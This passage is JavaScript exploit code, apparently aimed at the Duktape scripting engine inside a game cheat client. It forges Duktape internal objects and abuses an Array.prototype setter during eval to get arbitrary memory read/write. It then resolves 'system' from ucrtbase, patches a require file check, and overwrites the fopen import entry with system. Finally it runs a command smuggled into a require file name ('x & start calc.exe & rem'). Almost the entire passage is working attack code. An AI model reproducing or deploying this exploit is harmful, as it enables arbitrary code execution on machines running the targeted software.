        "UI.AddCheckbox",
        "Entity.GetLocalPlayer",
        "Globals.Curtime"
    ];
    var i;
    var base;

    base = findOtcInnerBaseByModSearch();
    if (base !== 0) {
        return base;
    }

    for (i = 0; i < names.length; i++) {
        base = tryFunctionCandidate(names[i]);
        if (base !== 0) {
            return base;
        }
    }
    return 0;
}

function resolveExport(moduleBase, wanted) {
    var pe;
    var opt;
    var expRva;
    var expSize;
    var exp;
    var numNames;
    var funcs;
    var names;
    var ords;
    var i;
    var nameRva;
    var name;
    var ord;
    var funcRva;

    pe = (moduleBase + read32((moduleBase + 0x3c) >>> 0)) >>> 0;
    opt = (pe + 0x18) >>> 0;
    expRva = read32((opt + 0x60) >>> 0);
    expSize = read32((opt + 0x64) >>> 0);
    if (expRva === 0) {
        return 0;
    }

    exp = (moduleBase + expRva) >>> 0;
    numNames = read32((exp + 0x18) >>> 0);
    funcs = (moduleBase + read32((exp + 0x1c) >>> 0)) >>> 0;
    names = (moduleBase + read32((exp + 0x20) >>> 0)) >>> 0;
    ords = (moduleBase + read32((exp + 0x24) >>> 0)) >>> 0;

    for (i = 0; i < numNames; i++) {
        nameRva = read32((names + i * 4) >>> 0);
        name = readAsciiAt((moduleBase + nameRva) >>> 0, 96);
        if (name === wanted) {
            ord = read16((ords + i * 2) >>> 0);
            funcRva = read32((funcs + ord * 4) >>> 0);
            if (funcRva >= expRva && funcRva < ((expRva + expSize) >>> 0)) {
                log("forwarded export " + wanted + "=" + readAsciiAt((moduleBase + funcRva) >>> 0, 128));
                return 0;
            }
            return (moduleBase + funcRva) >>> 0;
        }
    }
    return 0;
}

function makeFake() {
    var arenaInfo = Duktape.info(arena);
    var base = (parseInt(String(arenaInfo.hptr), 16) + 0x18) >>> 0;
    var comp = (base + 0x000) >>> 0;
    var funcData = (base + 0x100) >>> 0;
    var const0 = (funcData + 0x18) >>> 0;
    var code = (const0 + 0x08) >>> 0;
    var fakeObj = (base + 0x200) >>> 0;
    var fakeBuf = (base + fakeBufOff) >>> 0;

    log("arena=" + String(arenaInfo.hptr) + " fakeObj=" + hex32(fakeObj) + " fakeBuf=" + hex32(fakeBuf));

    /* duk_hcompfunc */
    w32buf(0x000, 0x18040b81);
    w32buf(0x004, 0x10000000);
    w32buf(0x008, 0x00000000);
    w32buf(0x00c, 0x00000000);
    w32buf(0x010, 0x00000000);
    w32buf(0x014, 0x00000000);
    w32buf(0x018, 0x00000000);
    w32buf(0x01c, 0x00000000);
    w32buf(0x020, 0x00000000);
    w32buf(0x024, 0x00000000);
    w32buf(0x028, funcData);
    w32buf(0x02c, code);
    w32buf(0x030, code);
    w32buf(0x034, 0x00000000);
    w32buf(0x038, 0x00000000);
    w16buf(0x03c, 0x0000);
    w16buf(0x03e, 0x0000);

    /* function data fixed buffer: const0 fake Uint8Array object + RETCONST 0. */
    w32buf(0x100, 0x00000002);
    w32buf(0x104, 0x10000000);
    w32buf(0x108, 0x00000000);
    w32buf(0x10c, 0x00000000);
    w32buf(0x110, 0x0000000c);
    w32buf(0x118, fakeObj);
    w32buf(0x11c, 0xfff90000);
    w32buf(0x120, 0x0000009f);

    /* fake duk_hbufobj, class Uint8Array. */
    w32buf(0x200, 0xb0002081);
    w32buf(0x204, 0x10000000);
    w32buf(0x208, 0x00000000);
    w32buf(0x20c, 0x00000000);
    w32buf(0x210, 0x00000000);
    w32buf(0x214, 0x00000000);
    w32buf(0x218, 0x00000000);
    w32buf(0x21c, 0x00000000);
    w32buf(0x220, 0x00000000);
    w32buf(0x224, 0x00000000);
    w32buf(0x228, fakeBuf);
    w32buf(0x22c, 0x00000000);
    w32buf(0x230, 0x00000000);
    w32buf(0x234, 0x00001000);
    w8buf(0x238, 0x00);
    w8buf(0x239, 0x00);
    w8buf(0x23a, 0x01);

    /* fake external hbuffer. */
    w32buf(fakeBufOff + 0x00, 0x00000182);
    w32buf(fakeBufOff + 0x04, 0x10000000);
    w32buf(fakeBufOff + 0x08, 0x00000000);
    w32buf(fakeBufOff + 0x0c, 0x00000000);
    w32buf(fakeBufOff + 0x10, 0x00001000);
    w32buf(fakeBufOff + 0x14, base);

    fakeCompPtr = hex32(comp);
}

function install() {
    Object.defineProperty(Array.prototype, 0, {
        set: handler,
        configurable: true
    });
}

function handler(v) {
    var out;
    hits++;
    out = (hits === 1) ? P(fakeCompPtr) : v;
    delete Array.prototype[0];
    this[0] = out;
    install();
}

function buildArw() {
    makeFake();
    install();
    eval("function\u0009\u2029w(\u000C)\u00A0{\u000D};");
    rw = w();
    log("arw ready tag=" + Object.prototype.toString.call(rw) + " hits=" + hits);
}

function main() {
    var otcBase;
    var fopenIat;
    var oldFopen;
    var requireCheckJcc;
    var oldCheckJcc;
    var ucrtBase;
    var systemPtr;
    var cmdName;

    buildArw();

    otcBase = findOtcBase();
    log("selected otcBase=" + hex32(otcBase));
    if (otcBase === 0) {
        throw new Error("failed to find otc module base");
    }

    fopenIat = (otcBase + 0x10a5130) >>> 0;
    oldFopen = read32(fopenIat);
    ucrtBase = findModuleBase(oldFopen);
    log("fopenIAT=" + hex32(fopenIat) + " fopen=" + hex32(oldFopen) + " ucrtBase=" + hex32(ucrtBase));
    if (oldFopen === 0 || ucrtBase === 0) {
        throw new Error("failed to find ucrtbase from fopen");
    }

    systemPtr = resolveExport(ucrtBase, "system");
    log("system=" + hex32(systemPtr));
    if (systemPtr === 0) {
        throw new Error("failed to resolve system");
    }

    if (!DO_RCE) {
        log("locator only: set DO_RCE=true after these addresses look sane");
        return;
    }

    if (PATCH_REQUIRE_FILE_CHECK) {
        requireCheckJcc = (otcBase + 0x10605a) >>> 0;
        oldCheckJcc = read8(requireCheckJcc);
        log("require file check jcc=" + hex32(requireCheckJcc) +
            " old=" + oldCheckJcc.toString(16));
        if (read8((requireCheckJcc + 1) >>> 0) !== 0x1a ||
                (oldCheckJcc !== 0x75 && oldCheckJcc !== 0xeb)) {
            throw new Error("unexpected require file check bytes");
        }
        write8(requireCheckJcc, 0xeb);
        log("require file check patched");
    }

    write32(fopenIat, systemPtr);
    log("fopen IAT patched");

    cmdName = "x & start calc.exe & rem";
    try {
        require(cmdName);
    } catch (e) {
        log("require returned error=" + e);
    } finally {
        write32(fopenIat, oldFopen);
        log("fopen IAT restored");
        if (PATCH_REQUIRE_FILE_CHECK) {
            write8(requireCheckJcc, oldCheckJcc);
            log("require file check restored");
        }
    }
}

try {
    log("start");
    main();
    log("done");
} catch (e) {
    log("fatal=" + e);
}

```